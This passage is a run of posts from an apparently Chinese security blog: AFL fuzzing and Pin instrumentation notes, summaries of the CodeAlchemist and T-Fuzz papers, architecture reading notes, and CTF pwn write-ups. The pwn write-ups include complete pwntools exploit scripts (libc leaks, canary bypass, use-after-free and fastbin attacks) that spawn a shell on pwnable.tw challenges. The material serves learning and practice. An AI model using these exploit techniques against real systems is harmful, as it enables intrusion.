没有办法提供更多结构化的底层语法的描述，但是fuzzer可能会根据单独的插桩反馈来找出其中的一些。 参考： 单独的插桩反馈 即使当没有给出明确的字典时，afl-fuzz将通过在确定性字节翻转期间非常仔细地观察插桩来尝试提取输入语料库中的现有语法表示（token-表示，记号）。 这适用于一些类型的解析器和语法，但不像-x模式那么好。 如果字典真的很难得到，另一个选择是让AFL运行一段时间，然后使用AFL自带的表示捕获库。 有关详细信息，请参阅libtokencap/README.tokencap。 有关字典的使用和简单介绍 基于覆盖的崩溃分组通常生成一个小数据集，可以手动或使用非常简单的GDB或Valgrind脚本快速分类。每个崩溃也可追溯到其在queue中的非崩溃的parent测试用例，从而更容易诊断故障。 崩溃探索模式，使用-C标志 . 崩溃探索模式 在这种模式下，模糊器需要一个或多个崩溃的测试用例作为输入，并使用其反馈驱动的fuzzing策略来快速枚举程序中可以到达的所有代码路径，同时保持其处于崩溃状态。不导致崩溃的变异被拒绝; 任何不影响执行路径的更改也一样。输出是一个小文件库，可以快速检查攻击者对故障地址的控制程度，或者是否有可能通过一个初始的越界读取，以及查看下面的内容 。 由于有些内存访问错误并不一定会造成程序崩溃，如越界读，因此在没有开启ASAN的情况下，许多内存漏洞是无法被AFL发现的。所以，编译目标二进制代码时，开启ASAN，也是推荐的做法。对于使用afl-xxx编译来说，只需要设定环境变量AFL_USE_ASAN=1即可。 如果要使用ASAN，建议添加CFLAGS=-m32指定编译目标为32位；否则，很有可能因为64位消耗内存过多，程序崩溃。如果使用了ASAN，还需要注意为afl-fuzz通过选项-m 指定可使用的内存上限。一般对于启用了ASAN的32位程序，-m 1024即可。 AFL编译链接可执行文件和库文件时，建议使用static link(静态链接库，libxxx.a文件)，当使用动态链接库时，将动态链接库（如当前目录）加到环境变量中：export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:. clang 10中的SanitizerCoverage ,UndefinedBehaviorSanitizer -fsanitize-coverage=trace-pc-guard 这一选项会使编译器在任一代码块边缘插入以下代码, 因为每条边缘都有自己的guard_variable(uint32_t) 1__sanitizer_cov_trace_pc_guard(&amp;guard_variable) 同时编译器还将插入对模块构造函数的调用 1234// The guards are [start, stop).// This function will be called at least once per DSO and may be called// more than once with the same values of start/stop.__sanitizer_cov_trace_pc_guard_init(uint32_t *start, uint32_t *stop); ...=trace-pc,indirect-calls 选项会使在每个间接调用中插入 1__sanitizer_cov_trace_pc_indirect(void *callee) __sanitizer_cov_trace_pc_* 这些函数内部实现应该由用户定义, 它包含了对函数调用的检测和控制以及PC指针的控制权. -fsanitize-coverage=inline-8bit-counters 类似trace-pc-guard但是替换了回调,而是放置了一个计数器. -fsanitize-coverage = pc-table 编译器将创建一个已检测PC的表。 需要-fsanitize-coverage = inline-8bit计数器或-fsanitize-coverage = trace-pc-guard SanitizerCoverage clang 10 documentation UndefinedBehaviorSanitizer Sanitizer合集 统计代码覆盖率的两种情况: 有源码: SanitizerCoverage, 在编译选项中添加相应的覆盖率统计方式，比如基本块统计方式可以添加： 1CFLAG=“-fsanitize=address -fsanitize-coverage=bb” 无源码: 使用Pin、DynamoRIO等二进制插桩工具去hook统计，或者pediy改指令的方式去监控也是可以的 How Much Test Coverage Is Enough For Your Testing Strategy? 插桩源代码插桩和二进制插桩 根据二进制指令数量分析二进制 简单来说就是依靠统计指令数量来推测每一步调用频率最高的指令, 类似bruteforce的思路. 12345678910111213141516171819202122232425import sysimport commandsif __name__ == &quot;__main__&quot;: pwd = &quot;________&quot; base = 0x2e off = 0x00 sav = 0x00 while pwd.find(&quot;Good Password&quot;) == -1: pwd = pwd[:off] + chr(base) + pwd[off+1:]; cmd = &quot;./pin -t ./inscount0.so -- ./crackme &lt;&lt;&lt; %s &gt; /dev/null; cat inscount.out&quot; %(pwd) res = int(commands.getstatusoutput(cmd)[1].split(&quot;Count&quot;)[1]) print &quot;insert('%s') = %d ins&quot; %(pwd, res) if sav == 0x00: sav = res if res - sav &gt; 200: off += 1 if off &gt;= len(pwd): break base = 0x2d sav = 0 base += 1 sav = res print &quot;The password is %s&quot; %(pwd) sys.exit(0) Linux进程执行 Pin: 动态插桩. 支持插桩现实世界的应用, 支持插桩多线程应用, 支持信号量. 在指令代码层面实现编译优化. 用户可以用API编写由Pin调用的动态链接库形式的插件, 成为Pintool. Pin 由进程级的虚拟机、代码缓存和提供给用户的插桩检测 API 组成。Pin 虚拟机包括 JIT(Just-In-Time) 编译器、模拟执行单元和代码调度三部分，当 Pin 将待插桩程序加载并获得控制权之后，在调度器的协调下，JIT 编译器负责对二进制文件中的指令进行插桩，动态编译后的代码即包含用户定义的插桩代码。编译后的代码保存在代码缓存中，经调度后交付运行。 程序运行时，Pin 会拦截可执行代码的第一条指令，并为后续指令序列生成新的代码，新代码的生成即按照用户定义的插桩规则在原始指令的前后加入用户代码，通过这些代码可以抛出运行时的各种信息。然后将控制权交给新生成的指令序列，并在虚拟机中运行。当程序进入到新的分支时，Pin 重新获得控制权并为新分支的指令序列生成新的代码。 通常插桩需要的两个组件都在Pintool中: 1. 插桩代码(instrumentation code), 在什么位置插入插桩 2. 代码分析代码(analysis code), 在选定的位置要执行的代码 Pintool 采用向 Pin 注册插桩回调函数的方式，对每一个被插桩的代码段，Pin 调用相应的插桩回调函数，观察需要产生的代码，检查它的静态属性，并决定是否需要以及插入分析函数的位置。分析函数会得到插桩函数传入的寄存器状态、内存读写地址、指令对象、指令类型等参数。 Instrumentation routines：仅当事件第一次发生时被调用 Analysis routines：某对象每次被访问时都调用 Callbacks：无论何时当特定事件发生时都调用 一般pintool的基本框架，在main函数中首先调用PIN_Init初始化，之后就可以使用INS_AddInstrumentFunction注册一个插桩函数，在原始程序的每条指令被执行前，都会进入Instruction这个函数中，其第2个参数为一个额外传递给Instruction的参数，即对应VOID *v这个参数，这里没有使用。而Instruction接受的第一个参数为INS结构，用来表示一条指令。 最后又注册了一个程序退出时的函数Fini，接着就可以使用PIN_StartProgram启动程序了 pin简介 语法分析语法分析工具 abnf fuzzer 畸形数据的生成基于合适的语法准则可以提高质量.","link":"/2019/10/16/2019-10-16-fuzz1/"},{"title":"pwnable刷题笔记一","text":"开始认真刷题了嘤嘤嘤…..先从pwnable.tw开始吧 做了第一行, 来记个笔记 start 纯汇编题, 然后调用基本上查询32位Linux函数调用规则就能写出shellcode 但总结起来还是栈题的基本思路之一 一. 想办法泄露栈基址 二. 写shellcode打过去 orw 标题其实已经暗示了, 这是一道沙箱逃逸题 具体的沙箱知识我就不贴了, 大佬们写的博客有很多, 我就自己总结一下思路吧 用seccomp-tools查看一下可用的函数, 当然在本题中, 用ida也可以查看到. 再看ida, 这里有个点提一下, 具体的沙箱内容等我下次写个专题… 当option为PR_SET_NO_NEW_PRIVS(38),且arg2为1时,将无法获得特权,当option为PR_SET_SECCOMP(22)时,效果就是seccomp了,如果arg2为SECCOMP_MODE_STRICT(1),则只允许调用read,write,_exit(not exit_group),sigreturn这几个syscall.如果arg2为SECCOMP_MODE_FILTER(2),则为过滤模式,其中对syscall的限制通过arg3用BPF(Berkeley Packet Filter)的形式传进来,是指向struct sock_fprog数组的指针. 因为文件有read函数…还提示了写shellcode…那当然是execve打过去 :) 这里shellcode的基本写法说一下: 先清理环境, 基本上调用的用到的寄存器都需要清理 push ecx只是单纯的让栈增长一下 放进shellcode注意计算机的大端小端 向寄存器中放入相应值时尽可能考虑重复性来节省shellcode长度(比如固定的shellcode字符地址…) 用nop适当间隔 注意最后的add esp, xxx来恢复堆栈平衡,然后ret. calc 重点在calc函数里 bzero是清零函数, get_expr是获得常规的计算操作符和数字 parse_expr函数是关键的解析函数, 还好以前实现类似计算器功能的程序, 简单来说就是操作符和操作数分开. 虽然分成了两个类似栈的结构来存储, 但这里还是能看出区别, 即存储数据的数组头部是一个类似index作用的数字,这有点意思,其实就是后面的漏洞点 然后这里是对操作符的处理和存储. 其中operate[v7]是上一个存储的操作符, 而(char)(i+a1)是当前遇到的操作符,然后进入eval函数操作 可以看到eval函数的处理是将结果计算并存储到下标为1的数组单元 行吧parser_expr函数逻辑大致清楚了,咱回到calc函数来,这里是输出了v2[v1-1]的内容, 查看一下栈,发现是输出了之前存储数据数组的头部,即index值,好了思路又来了,尝试修改index值来泄露出数组范围外的数. 具体的思想历程就不说了, 这里是输入类似 ‘+361’的数据来运用该计算器的规则来使index变为我们想要的值. 贴exp 这里有些小技巧点, 比如计算栈空间长度, 根据该函数ebp泄露主函数基址,然后在进行偏移计算等. and 老样子execv(‘/bin/sh’) 3x17 已经有大佬讲的很详细了, https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/ 程序很简单,任意地址限定字符写 因为只有一次,而且字符太有限,开了nx保护,且不知道main函数的位置… 那基本上是改变程序流的一个思路, 这里是从libc_fini覆盖fini_array去搞事情 https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/libc-start.c https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/csu/elf-init.c __libc_csu_init执行.init和.init_array, __libc_csu_fini执行.fini和.fini_array 1234并且执行顺序如下：__libc_csu_initmain__libc_csu_fini 借个图 123456789101112131415161718192021222324252627282930313233343536373839404142+---------------------+ +---------------------+ +---------------------+ +---------------------+| | | | | | | || main | +--------&gt; | __libc_csu_fini | +-------&gt; | .fini_array[1] | +-------&gt; | .fini_array[0] || | | | | | | |+---------------------+ +---------------------+ +---------------------+ +---------------------++---------------------+ +---------------------+ +---------------------+ +---------------------+| | | | | | | || main | +--------&gt; | __libc_csu_fini | +-------&gt; | .fini_array[1] | +-------&gt; | .fini_array[0] || | | | | main | | __libc_csu_fini |+---------------------+ +---------------------+ +---------------------+ +---------------------+ ^ + | | +----------------------------------+最终效果图low addr 0x4b40f0 +----------------+ | | | | | .fini_array[0] | | (rbp) | | | 0x4b40f8 +----------------+ | | | | | .fini_array[1] | | (rip) | | | rsp +----&gt; 0x4b4100 +----------------+ +-+ | | | | + | | | | | | | .data.rel.ro | | rop chain | (read/write) | | | | | | | | | | | | | v | | high addr +----------------- +-+ 直接上exp了","link":"/2019/09/20/2019-09-20-pwnable1/"},{"title":"CodeAlchemist 和 T-Fuzz论文阅读","text":"近来事务繁多, 很多事情不得不用并行的方式… 意识到博客好久没更新了,很多东西都堆积着没整理, 今日终于可以发一些出来了2333. 贴个链接, 是一位学长创建的关于fuzzpaper翻译阅读的仓库. 我有幸和大佬学长一起做这件事,从学长整理思路的方式也学到了很多, 希望有感兴趣的师傅加入我们. fuzzpaper CodeAlchemist 和 T-Fuzz论文阅读 CodeAlchemist: Semantics-Aware Code Generationto Find Vulnerabilities in JavaScript Engines提出了新的测试用例算法, 模糊测试工具CodeAlchemist-开源. CodeAlchmist 可以生成任意在语义和语法上正确的JS代码,并有效地产生了导致JS引擎崩溃的测试用例. CodeAlchemist由三个主要组件组成： SEEDPARSER模块将给定的JS种子分解为一组代码块。 CONSTRAINTANALYZER模块为每个代码块推断出装配约束，并使用计算出的装配约束对它们进行注释，最终构成代码块池。 ENGINEFUZZER模块根据其组装约束条件从池中组装代码砖，以生成测试用例并针对目标JS引擎执行生成的测试用例。 关键方法: 将JS种子分裂成代码块.每个代码块有一组约束,表示代码块什么时候可以和其他代码块组合. 具体来说, 使用经典数据流分析计算在每个代码块中使用和定义了哪些变量，并动态找出它们的类型。 仅当从每个其他代码块中正确定义了每个代码块中的已使用变量，并且它们的类型匹配时，他们才合并代码块, 互锁代码块时，装配约束有助于种子遵循语言语义 优缺点: 提出用于模糊JS引擎的语义感知程序集. 可以在模糊测试期间生成随机但仍保留语义的JS代码片段. 不仅关注解决语法错误，而且还针对语义错误，这与任何其他现有的JS引擎模糊测试工具不同. 可将它们拆分为JS expressions的粒度。由于JS表达式本身形成有效的AST，因此它也可以是有效的代码块。与LangFuzz的方法相比，表达式级的片段化所导致的代码块数量更少，但它无法捕获JS代码的高级结构。 装配约束 具体来说，一个装配约束约束两个条件：一个前置条件和一个后置条件。 前提条件是在运行时不会发生运行错误的情况下，为执行代码块而需要定义的一组变量符号及其类型。后置条件描述了在评估代码块之后在代码块的末尾可以使用哪些变量，即定义了哪些变量。 CodeAlchemist运作的具体步骤和思路 获取独一无二的代码块: 解析种子生成语法树. 分裂成块 序列化这些代码块中的标识符,并去掉重复的. 计算装配约束 使用静态数据流分析(维护了一个use-def链)指出哪些变量是被使用或者被定义在每个代码块 重写给定的种子文件,以记录每个代码块所有变量的类型 通过执行重写的种子,动态地识别每个代码块中使用或定义的所有变量的类型 用推断的类型信息注释每个代码块,形成组装约束. 通过将池中的代码块互锁来生成测试用例 代码生成算法 123456789101112131415161718192021Input: A pool of code bricks (P), A code brick (B), The max number of iterations for code generation (imax), The probability of reinventing block statements (pblk), The max number of statements in a block body (iblk), The max nesting level for a block statement (dmax).Output: A generated code brick representing a test case1 function Generate(P,B,imax,pblk,iblk,dmax)2 for i= 1 to imax do3 if RandProb() &lt; pblk and dmax &gt; 0 then 4 B′ ← GenBlkBrick(P,B,pblk,iblk,dmax-1)5 else 6 B′←PickBrick(P,B)7 B←MergeBricks(B,B′)8 returnB9 function GenBlkBrick(P,B,pblk,iblk,dmax)10 B′←PickEmptyBlock(P,B)11 B0←GetDummyBrick(B,B′)12 i←RandInt(iblk)13 B′′←Generate(P,B0, i,pblk,iblk,dmax)14 return MergeBricks(B′,B′′) 10. T-Fuzz: fuzzing by program transformation - S&amp;P 2018简介: 思路比较新奇, 通过删除目标程序中的合理性检查来提高代码覆盖率. 简单来说, 当fuzzer不能再出发新的代码路径时,就会寻找导致输入失败的检查机制,然后这些机制从程序中移除,继续fuzz.利用 基于符号执行的后处理分析来弥补缺点, 遇到的问题: 取消检查会导致过高逼近和误报 即使是真正的错误，转换后的程序上崩溃对应的输入也可能不会触发原始程序中的错误。 解决方法: T-Fuzz利用基于符号执行的方法来过滤误报并在原始程序中重现真实的错误. 通过对程序进行转换以及对输入进行变异，可以覆盖更多的代码并发现更多的真实结果。 优点: 与现有的基于符号分析的方法相比，T-Fuzz在两个方面表现出色： 更好的可伸缩性：通过在模糊处理过程中利用基于轻量级动态跟踪的技术，并将重量级符号分析的应用限于检测到的崩溃，标量 T-Fuzz的能力不受绕过复杂输入检查的需求的影响； 覆盖比较严格检查保护的代码路径的能力 本文贡献: 证明了模糊测试可以通过转换目标程序而不是采用程序分析技术来更有效地发现错误. 提出一套使模糊测试可以改变输入和程序的技术，包括（i）自动检测的技术 目标程序中的完整性检查；（ii）进行程序转换以删除检测到的完整性检查；（iii）通过过滤只在转换后的程序中崩溃的误报，在原始程序中重现错误. 在CGC上评估了T-Fuzz 数据集，LAVA-Mdataset和4个实际程序。证明了该技术的有效性. 发现了3个新错误：两个inmagick / ImageMagicK错误和一个inpdftohtml / libpoppler错误。 fuzz的主要步骤: 第一步是比较简单的类似广搜算法. 搜索检查机制, 去掉不必要的检查机制. 第二步 程序转换是关键点, 作者一方面考虑了动态二进制指令分析, 静态二进制重写,翻转跳转指令的条件等. 另一方面, 因为条件跳转的翻转条件对二进制文件长度来说是直接并且中性的(不太理解,欢迎各位师傅指点), 从而提供了静态重写的优点, 无需复杂的程序分析技术, 所以只需翻转条件跳转指令的条件即可. 其次这样做保留了程序原有的结构. 转换程序的算法也很明确 12345678910111213Input: program: the binary program to transformInput: caddrs: the addresses of conditional jumps negated in the input programInput: NCC: NCC candidates to remove1 transformed_program ← Copy(program)2 for e ∈ NCC do3 basicblock ← BasicBlock(transformed_program, e.source)4 for i ∈ basic_block do5 if i is a conditional jump instruction and i.addr /∈ c_addrs then6 negate_conditional_jump(program, i.addr)7 c_addrs ← c_addrs∪{i.addr}8 breakOutput: transformed_program: the generated program with NCC candidate disabledOutput: caddrs: the locations modified in the transformed program 第三步过滤掉误报并重现真实的错误, 概括说,维护两组约束,一组跟踪转换后程序中的约束(CT),一组跟踪原始程序的(CO),初始将其转换为预约束(PC)加到CT,之后如遇到基本块包含否定的条件跳转,则把关联的反向路径约束放入CO,否则将路径跳转放入CO.具体看算法.","link":"/2019/10/31/2019-10-31-CodeAlchemistandT-Fuzz/"},{"title":"计算机组成与设计阅读笔记","text":"大学教的是csapp, 内容有较多相似的地方, 但是换了个MPIS的体系结构. 所以我主要针对了不同点和自己感兴趣的地方做了笔记, 内容不全, 纯粹方便自己翻阅. 计算机体系结构一个程序的CPU执行时间 = 一个程序的CPU时钟周期数 * 时钟周期时间或者=一个程序的CPU时钟周期数/时钟周期频率 CPI是指令的平均执行时钟周期 影响CPU性能有三个方面,完成某功能所需的指令数,每条指令的周期数以及处理器的时钟频率. 晶体管能耗正比于 1/2* 负载电容 * 电压 ^2, 功耗正比于 1/2 * 负载电容 * 电压^2 * 开关频率 由于特定改进的性能提升可能由所使用的改进特征的数量所限制. 收益递减定律. 秒数/程序 = 指令数/程序 * 时钟周期数/指令数 * 秒数/时钟周期数 mips的寄存器约定 mips汇编语法 MIPS的寻址模式, 可类比其他架构的寻址模式: 立即数寻址,操作数是位于指令自身中的常数 寄存器寻址,操作数是寄存器 基址寻址,操作数在内存,地址是指令中基址寄存器和常数的和 PC相对寻址,地址是PC和指令中常数的和 伪直接寻址,跳转地址由指令中26位字段和PC高位相连而成 链接取数/条件存数机制的优点是可以通过它们来构造其他的注入原子比较和交换或原子取后加等同步原语. ARMv7只有15个寄存器, 比MIPS的31个寄存器少, 因此他的寻址模式也叫为丰富, 设计了9中寻址方式: ARMv7的体系结构下:使用传统的存储在程序状态字体的4位条件码来决定条件分支是否执行. 这四个条件码是: 负值, 零, 进位, 溢出. 每条指令都有一个可选的执行条件,这个条件决定于调价码,而这些条件码可以被任何算术或逻辑指令设置. 每条指令开始的4位字段决定这条指令将执行空操作还是真实的指令操作,而这种选择也取决与条件码. x86与ARM和MIPS在操作数的算术,逻辑和数据传输指令的不同之处在于 x86的源操作数和目的数可以是同一个寄存器. x86指令中的一个操作数可以在存储器中. 一个程序所需的指令条数由编译器和指令集决定. 支持虚拟机的软件为虚拟机监视器(VMM)或者管理程序(hypervisor). VMM是虚拟机的核心. 它决定如何将虚拟资源映射到物理资源. VMM所需要的控制: 访问特权状态, I/O, 异常和中断. 处理器虚拟化的开销通常取决于工作量. 用户级处理器限制性程序因为没有虚拟化开销, 因为操作系统较少被调用,所以所有程序能以本来速度运行.而I/O密集型负载是个反例. 其次开销也取决于需要由VMM进行模拟的指令数目以及模拟速度的快慢.","link":"/2019/10/13/2019-10-13-txjg1/"},{"title":"pwn刷题笔记二","text":"dubblesort 漏洞类型: 读入输出型. 格式化. 保护全开 利用思路: 泄露libc地址, 覆盖返回地址 首先运行程序, 是个排序程序, 同时发现程序反馈语句中有奇怪的字符 对着这个点看ida内文件. 发现是一个读入输出型结构. 一般来说这类不会直接给明显的漏洞点, 但是我们可以利用这类漏洞泄露栈上的一些信息. 继续看整个程序的逆向代码. 其中sort是冒泡排序函数,没有找到利用点. 利用点应该说是在整个程序的结构中. 它是一个经典的读入输出利用型pwn题. 我们通常通过输入一些特殊的数据来泄露可以利用的信息(通常是地址),然后进一步操作. 这题是保护全开的栈题, 地址受aslr的影响,我们首先尝试read那一步是否可以利用. 那自然我们调试到read调用时,查看字符填充的地址,这里是 0xffffd60c 可以看到栈上有一个地址有点特殊,查看一下发现是libc地址段的地址. 再查看一下需要填充的字符是24个字符, 而泄露地址和libc基地址偏移是0x1b0000 现在我们有libc地址了, 然后开始运用另一个漏洞点,这里涉及到一个点, 因为我们输入数据时格式参数是”%u”, 填入”+” “-“是scanf会忽略输入, 不会覆盖存储位置原来的值. 可以调试实验,这里就不贴了. 因为程序开了canary. 而程序并没有对输入”number”的数量做限制,那基本思路就是在canary处填”+”,然后返回地址填入system函数的地址. 最后填入/bin/sh地址就能getshell了. 先发送24个’a’用于泄露libc上的地址. 然后个数35, 24个地址单元(0x60大小)的’0’, ‘+’, 和7个比canary大的数,然后是system函数地址,system函数返回地址,bin_sh地址 这里的填充大小需要调试确定. 计算数字到ebp的距离为0x7c，在IDA可以看到numbers和canary的距离为0x60/4 = 24，所以需要先填充24个0，然后输入+非法字符但被视为合法输入不被写到栈上，可以绕过canary保护，然后canary到ebp的距离为0x7c-0x60-4 = 24/4 = 6，再加上覆盖ebp，需要填充比canary大的7个数，然后是system函数地址。 调试到输入number前的scanf,可以发现填入0xffffd5ec,在这里查看ebp和填入位置的偏移距离 放个exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'context.terminal = ['tmux','splitw','-h']#p = remote('chall.pwnable.tw',10101)p = process('./dubblesort')elf_libc = ELF('./bc.so.6')got_plt_offset = 0x1b0000# leak libc addresspayload_1 = &quot;a&quot;*24p.recv()p.sendline(payload_1)libc_addr = u32(p.recv()[30:34])-0xalibcbase_addr = libc_addr - got_plt_offsetprint hex(libc_addr)print hex(libcbase_addr) #print hex(libcbase_addr)#onegadget_addr =0x3a819 + libcbase_addrsys_addr = libcbase_addr + elf_libc.symbols['system']bin_sh_addr = libcbase_addr + elf_libc.search('/bin/sh').next()print hex(sys_addr)print hex(bin_sh_addr)#gdb.attach(p)p.sendline('35')p.recv()for i in range(24): p.sendline('0') p.recv()p.sendline('+')p.recv()for i in range(9): p.sendline(str(sys_addr)) p.recv()p.sendline(str(bin_sh_addr))p.recv()p.interactive() hacknote 漏洞类型: got部分可写,另外保护全开, fastbinattack, haijacking. 利用思路: 利用结构体中的指针泄露, fastbin的单链表和相同大小块特性 ida 分析，有add，delete，print 3个主要功能，从add中可以看出一个note 会分配8个字节，前四字节指向print功能所要调用的函数，后四节指向note中的具体内容。 print输出content的内容, 而漏洞点在delete中, uaf. 注意这里先free了content地址的内容,再free了list[i]. 这里的content是一个指针, 容易让人联想到泄露地址. 分析一下漏洞利用的思路, 全局变量list, 放置结构体的堆地址 看一下结构体和content的堆排列. 因为结构体是固定为0x8+0x8=0x10大小的,而free的时候是连着先free content,再free 结构体note的, 所以为了待会能够利用到那个note中的content指针, 我们需要free两次(其实是四个)后将其中一个结构体note的地址分配给content, 所以这里我们不能将content的大小设置为8, 用以构造如下结构实现fastbin attack. 所以基本思路如下: add 大于0x8的堆块 两次. 先free第一个, 再free第二个(这样就实现了 fastbin[0x10]: note2-&gt; note1) 再次add,这次要0x8的content大小,这样note2的地址分给了新add的note地址,note1的地址分给了content的地址. 这里content我们填入puts的got表地址. 现在可以看出整个结构 1代表note, 2代表content.同时地址都对上了. 然后开始常规操作, print泄露got地址.再次free 2, add, 将计算出system地址和”||sh”,分别填入note节点的第一项和第二项,再调用free,这样按顺序两者将被先后触发. 这里不填/bin/sh是因为4字节会截断字符. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw','-h']#con=remote(&quot;chall.pwnable.tw&quot;, 10102)con = process('./hacknote')e=ELF(&quot;./hacknote&quot;)elib=ELF(&quot;./bc.so.6&quot;)#puts_got=0x804a024puts_got = e.got[&quot;puts&quot;]printn=0x804862b#startdef addNote(size,content): con.recvuntil(&quot;choice :&quot;) con.sendline(&quot;1&quot;) con.recvuntil(&quot;size :&quot;) con.sendline(str(size)) con.recvuntil(&quot;Content :&quot;) con.sendline(content)def deleteNote(index): con.recvuntil(&quot;choice :&quot;) con.sendline(&quot;2&quot;) con.recvuntil(&quot;Index :&quot;) con.sendline(str(index))def printNote(index): con.recvuntil(&quot;choice :&quot;) con.sendline(&quot;3&quot;) con.recvuntil(&quot;Index :&quot;) con.sendline(str(index))def debug(): gdb.attach(con)addNote(24,24*&quot;a&quot;)addNote(24,24*&quot;a&quot;)deleteNote(0)deleteNote(1)addNote(8,p32(printn)+p32(puts_got))#debug()printNote(0)p=con.recv()puts_addr=u32(p[:4])d_value=elib.symbols[&quot;puts&quot;]-elib.symbols[&quot;system&quot;]sys_addr=puts_addr-d_valuedeleteNote(2)addNote(8,flat([sys_addr,&quot;||sh&quot;]))printNote(0)con.interactive() silver_bullet 漏洞类型: 没开canary和PIE, 但got表不可写,堆栈不可执行, 栈题, 溢出覆盖返回地址, 改变程序流, null by one. 利用思路: 首先还是想法泄露计算出libc基地址, 填入system函数或者onegadget尝试. 乍一看以为是堆题, 运行程序结合代码分析发现有三个主要的函数: create_bullet, power_up, beat. create_bullet:给出0x30大小的空间, 然后在填入description位置的0xc偏移处填入计算出的字符长度大小. 漏洞点在power_up, 首先这里要绕过的验证时一开始创建字符串的大小不能超过0x2f. 其次再次读入一堆字符, 它和前面计算出的len加起来的和要小于0x30, ( •̀ ω •́ )✧, 这里就来漏洞点了, strncat将读入的字符串接在之前的description,这个函数是会覆盖掉description后面的’\\x00’,然后再在最后的位置填入’\\x00’, 后面的这个’\\x00’正好可以尝试去覆盖掉len,使其变为0,这时候原本我们就可以再次power_up读入不大于0x2f的字符了. beat函数: 如果能让len+0x30大于0x7fffffff, “就可以让main函数结束”,当然我们不会这样放任它. 好了整体的利用思路如下: 首先明确,原始的栈上的分布是这样的,var4就是ebp. 先填入0x2f的大小的字符串.使其能绕过0x2f的验证,当然比这个小也可以.但不要太小,可能会导致后面无法覆盖到 在填入0x30减去前面len的长度的字符串,使其末尾的’\\x00’正好覆盖掉len.然后len会被赋值当前新填入字符串的长度. 伪造len长度使其逃过验证, 并覆盖ebp, ret用puts函数泄露出相关函数got表地址. 用计算出的system函数地址和bin_sh地址再次填入获取权限. 这里放一张已经布置好的栈分布图,这里1是len, 2是ebp, 3 是puts函数(但是实际他会偏移4,具体可调试看汇编), 4是返回地址,5是要泄露的函数. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/usr/bin/env pythonfrom pwn import *from time import sleepimport sysimport argparsecontext.log_level = 'debug'context.terminal = ['tmux','splitw','-h']context.binary = './silver_bullet'IP = 'chall.pwnable.tw'PORT = '10103'binary = './silver_bullet'parser = argparse.ArgumentParser()parser.add_argument('-d','--debugger', action='store_true')parser.add_argument('-r','--remote', action='store_true')parser.add_argument('-l','--local',action='store_true')args = parser.parse_args()sa = lambda x,y : io.sendafter(x,y)sl = lambda x : io.sendline(x)sd = lambda x : io.send(x)sla = lambda x,y : io.sendlineafter(x,y)rud = lambda x : io.recvuntil(x, drop=True)ru = lambda x : io.recvuntil(x)def lg(s, addr): print '\\033[1;31;40m%30s --&gt; 0x%x\\033[0m' % (s, addr)if args.remote: io = remote(IP, PORT) libc = ELF('./bc.so.6') elf = ELF(binary)elif args.local or args.debugger: #env = {&quot;LD_PRELOAD&quot;: os.path.join(os.getcwd(), &quot;libc.so.6&quot;)} env = {} io = process(binary, env=env) elf = ELF(binary) libc = ELF('./bc.so.6') #proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), binary))] #libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']else: parser.print_help() exit()def debug(msg=&quot;&quot;): #msg = &quot;&quot;&quot; # x/10xg 0x{:x} #&quot;&quot;&quot;.format(proc_base + 0x202080) gdb.attach(io)def create(content): io.sendlineafter('choice :','1') io.sendlineafter('bullet :',content)def power(content): io.sendlineafter('choice :','2') io.sendlineafter('bullet :',content)def beat(): io.sendlineafter('choice :','3')def exploit(): ret = 0x8048954 puts_plt = elf.plt['puts'] read_got = elf.got['read'] create('a'*0x2f) power('a') payload1 = '\\xff'*3 + 'b'*4 payload1 += p32(puts_plt) + p32(ret) + p32(read_got) power(payload1) beat() #debug() io.recvuntil('win !!\\n') read_adr = u32(io.recv(4)) print hex(read_adr) libc_base = read_adr - libc.symbols['read'] sys_adr = libc_base + libc.symbols['system'] binsh = libc_base + libc.search('/bin/sh\\x00').next() create('a'*0x2f) power('a') payload2 = '\\xff'*3 + 'b'*4 payload2 += p32(sys_adr) + p32(ret) + p32(binsh) power(payload2) beat() io.interactive()if __name__ == &quot;__main__&quot;: exploit() applestore(先放着…) 漏洞类型: 利用思路:","link":"/2019/11/17/2019-11-17-pwnable2/"},{"title":"湖湘杯和红帽杯赛题复现","text":"HackNote 漏洞点: off by one(准确的来说这里可以说是off by heap_size) 利用姿势: overlap, fastbin attack, malloc hook 太菜鸡, 遇到个静态编译, 没有符号表我就差点认不出strlen函数了… 不仅仅是strlen函数, 还有strcpy, strcmp, puts, gets等, 遇到\\x00才会截断. 这是因为\\x00的特殊_含义, 代表了文件结束符…所以说以后遇到字符串操作的函数, 找漏洞点的时候都应该去考虑这个点. 首先看程序流, 堆菜单有add, delete, edit三个函数, bss段有一个数组用于存储堆地址, 并在数组的偏移16个地址单位存有堆的size, 没有问题. delete函数free后将指针置零,也没有问题. 问题出在edit函数. 如图, note_list是存储堆地址的数组, 那偏移16就是在存储size, 调试一下就知道这个数字随着每次输入的长度而改变. 猜测那个sub_0_424590就是strlen函数. 自然联想到off by one, 我们申请不对齐的空间(多0x8),就可以将下个堆块的size读入进来, 也就是说下次可以多读入堆的size这个字段所占的字节数. 由于这里没有对堆块大小的限制, 于是我们考虑比较容易利用的overlap.通过fastbin attack修改fd来实现修改malloc_hook来getshell. 申请0x18, 0x108, 0x100,0x10大小空间, 分布如下 然后我们释放堆块1, 通过堆块0的off by one 修改堆块1的0x110为0x100, 这样堆块2前就会有0x10的空闲空间, 这是为了接下来overlap的时候绕过验证. 然后申请0x80,0x30,0x20大小空间, 现在分布如下 由于之前释放堆块1的时候, 堆块2的prev_size变为了0x110, 而堆块2之前的存有的0x10空间,所以怎么也不会影响到prev_size, 于是我们释放堆块1,2,4, 其中2实现overlap,现在将堆块分布如下. 插一句, 我们通过overlap构造fastbin attack中的fastbin是现在的堆块2. 所以我们申请0xa0和0x30的空间, 前者大小能覆盖到后者堆块的fd位置就好, 并提前写入想attack的位置, 